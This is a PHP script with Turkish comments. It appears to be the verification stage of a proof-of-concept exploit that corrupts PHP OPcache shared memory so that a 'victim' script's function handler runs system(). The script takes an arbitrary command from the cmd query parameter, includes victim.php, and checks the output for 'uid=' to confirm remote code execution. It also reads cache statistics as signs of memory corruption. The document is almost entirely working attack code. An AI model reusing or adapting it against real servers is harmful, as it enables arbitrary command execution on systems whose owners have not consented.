<?php
// Write dogrulama: victim'in handler'i ezildiyse ?test_rce=1&cmd=id ile RCE.
// Gercek yazma trigger_persist.php uzerinden attacker literal'leriyle yapilir.
header('Content-Type: application/json');

$result = [
    'pid' => getmypid(),
    'action' => 'verify_write',
];

// OPcache status'ten cached fonksiyonlarin listesini al
$status = opcache_get_status(true);
if (!$status || empty($status['scripts'])) {
    $result['error'] = 'no cached scripts';
    echo json_encode($result);
    exit;
}

// Cached script'lerin memory_consumption ve hit bilgilerini topla
$scripts_info = [];
foreach ($status['scripts'] as $path => $info) {
    $scripts_info[] = [
        'path'   => $path,
        'memory' => $info['memory_consumption'] ?? 0,
        'hits'   => $info['hits'] ?? 0,
    ];
}
$result['cached_scripts'] = $scripts_info;

// victim.php'deki handler'in degisip degismedigini kontrol et
// Bunu dolayil olarak yapariz: victim'i calistir ve davranisini gozle
// Eger handler zif_system ile ezilmisse, victim.php calistirmak
// system() calistirir ve ciktisinda uid= goruruz

if (isset($_GET['test_rce'])) {
    $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
    ob_start();
    // victim.php'yi include et — eger handler ezilmisse
    // literal okuma sirasinda system() calisir
    include '/var/www/html/victim.php';
    $output = ob_get_clean();

    $result['victim_output'] = substr($output, 0, 4096);
    $result['rce_confirmed'] = (strpos($output, 'uid=') !== false);

    if ($result['rce_confirmed']) {
        // uid= satirini cikar
        if (preg_match('/uid=\d+\([^)]+\)/', $output, $m)) {
            $result['proof'] = $m[0];
        }
    }
}

// SHM oom_restarts sayisi (corruption gostergesi)
$stats = $status['opcache_statistics'] ?? [];
$result['oom_restarts'] = $stats['oom_restarts'] ?? 0;
$result['hash_restarts'] = $stats['hash_restarts'] ?? 0;

echo json_encode($result, JSON_PRETTY_PRINT);
